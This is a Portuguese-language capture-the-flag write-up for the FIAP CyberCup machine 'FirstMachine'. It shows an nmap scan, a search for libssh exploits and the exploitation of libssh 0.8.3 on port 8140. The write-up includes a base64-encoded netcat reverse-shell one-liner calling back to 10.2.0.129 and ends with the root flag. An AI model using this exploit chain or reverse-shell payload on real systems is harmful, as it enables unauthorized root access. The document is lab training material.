---
title: FirstMachine
category:
 - FIAP CyberCup
---

## Enumeração

```plaintext
# Nmap 7.80 scan initiated Sat Jun 27 21:46:59 2020 as: nmap -p22,111,2049,8140,32927,42995,43131,53443 -Pn -A -oA full 10.2.0.10
Nmap scan report for 10.2.0.10                     
Host is up (0.00056s latency).                            
Scanned at 2020-06-27 21:47:06 -03 for 6s  
                                                                                                                     
PORT      STATE SERVICE  VERSION                 
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)                                              
| ssh-hostkey:                                                                                                                                                                                                                             
|   2048 61:bb:45:9e:3a:22:86:57:cf:04:95:ec:9e:3a:c9:83 (RSA)                                                                                                                                                                             
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDewxVaN18BQK55SlZpjEZO9oVrSMJeGSS4atWQMqQLdhiw0sdltVeqf0T9bG7mroCNF6nMXxQLU3syDKbvNPWb1YuN8n7KdtPRbclRieG8h4WTEpnhfsl2GwsbcwdxmzlkI1hTAKhDgJZPF+YPyRh3BmvyJaOr8Z8DQuQzcTReUc0L7SFyACrwBBWpdTpWfbClo
LfxcUYWwIJa7trQM7UJOqUkL4Lc/v1IySpMGbuZ1mylgXKFpagdTCyNQ9GSfrzj4a6QoLSy7YFAIcdB2biJgZjOM+e0lCLl2g38DCRwo2XN2Br2vJHkiauO+d8zDWm0sq/Bpwouu+Hw/mhdNSiR                                                                                        
|   256 3d:28:98:10:45:40:4a:82:f8:63:d7:19:38:3e:d9:17 (ECDSA)                                                      
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdjjOJTQXa2dfRAsTcI/n9a75qtd0HLiNHcjvV6tPtZ4cV3JyuJ/Ei4DkknVh/yx6JYjndNmGdx0zf4BGzKg5Y=                                                                         |   256 d6:26:94:02:47:50:6c:d6:b4:63:eb:c8:63:a6:14:ad (ED25519)                                                                                                                                                                          
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXhlDMBizu+w1gOjshDECAAM+T+PdW8v/5DXC/SE6JZ
111/tcp   open  rpcbind  2-4 (RPC #100000) 
| rpcinfo:                                  
|   program version    port/proto  service              
|   100000  2,3,4        111/tcp   rpcbind             
|   100000  2,3,4        111/udp   rpcbind            
|   100000  3,4          111/tcp6  rpcbind          
|   100000  3,4          111/udp6  rpcbind                                                                           
|   100003  3           2049/udp   nfs                                                                               
|   100003  3           2049/udp6  nfs              
|   100003  3,4         2049/tcp   nfs               
|   100003  3,4         2049/tcp6  nfs              
|   100005  1,2,3      32927/tcp   mountd          
|   100005  1,2,3      47087/tcp6  mountd                                                                            
|   100005  1,2,3      49612/udp6  mountd                                                                                                                                                                                                  
|   100005  1,2,3      58639/udp   mountd
|   100021  1,3,4      39047/tcp6  nlockmgr
|   100021  1,3,4      42995/tcp   nlockmgr
|   100021  1,3,4      45259/udp   nlockmgr
|   100021  1,3,4      54545/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl                                                                           
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl                                                                           
|_  100227  3           2049/udp6  nfs_acl                                                                                                                                                                                                 
2049/tcp  open  nfs_acl  3 (RPC #100227)                                                                                                                                                                                                   
8140/tcp  open  ssh      libssh 0.8.3 (protocol 2.0)                                                                 
| ssh-hostkey:                                                                                                                                                                                                                             
|   2048 95:4f:0d:77:af:d0:f4:94:81:43:3f:c0:2c:d3:a3:fe (RSA)   
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCxOFFxFNDxrETMdyJ954yJCy+XHXAolqsHXEAR5AGYhM2v4954ULOZ4jJ3fPis2wPGcHNOqg/QOtErs6BpiU5Ab1V4c1sGRwhXFyhIYQOtzRRMSPi+sYi7Cs0jy6ERGZVSjcP8GEBjgNPlTcKnilTHsUFutbUfTlWQDpPSuHZUGHfTr9ZJpGfOFuD3fozgHUvI
IeViGXX6FSVmabVROm6EK5767mak3luE8kbUPg3T9GxNjhZuW/G6HYSg6tIMlkETrMIBht7uVOhamIR0du5YywgwyJOQOoK0OvIp8tZqJ+Vcerc0lmtIx+KVXARFEByv/biAZmfH0GCHot/ORpb
32927/tcp open  mountd   1-3 (RPC #100005)
42995/tcp open  nlockmgr 1-4 (RPC #100021)
43131/tcp open  mountd   1-3 (RPC #100005)
53443/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                          
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 27 21:47:12 2020 -- 1 IP address (1 host up) scanned in 13.30 seconds

```

## Exploração

- Identificado vulnerabilidade da versão 0.8.3 da libssh, que encontra-se em execução na porta 8140.

```plaintext
zurc@kali:/dcruz/fiap/cybercup/firstMachine/scan$ searchsploit libssh
----------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
libSSH - Authentication Bypass                                                     | linux/remote/45638.py
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                         | linux/remote/46307.py
----------------------------------------------------------------------------------- ---------------------------------

```

- A dificuldade desta exploração foi passar os parametros de uma só vez no exploit, o que foi possível codificando comando em base64, conforme abaixo

```plaintext
echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.0.129 4443 >/tmp/f' | base64 -w0
```

```plaintext
zurc@kali:/dcruz/fiap/cybercup/firstMachine/exploit$ ./46307.py 10.2.0.10 8140 "echo -n 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMi4wLjEyOSA0NDQzID4vdG1wL2Y=' | base64 -d | bash"
/home/zurc/.local/lib/python3.8/site-packages/paramiko/rsakey.py:127: CryptographyDeprecationWarning: signer and verifier have been deprecated. Please use sign and verify instead.
  verifier = key.verifier(
```

- Após obter shell reverso, já obtido execução como root, obtendo a flag

```plaintext
# cat /root/root.txt  
pk2v8ed0u4n2x9sdu74f7v3m8
```
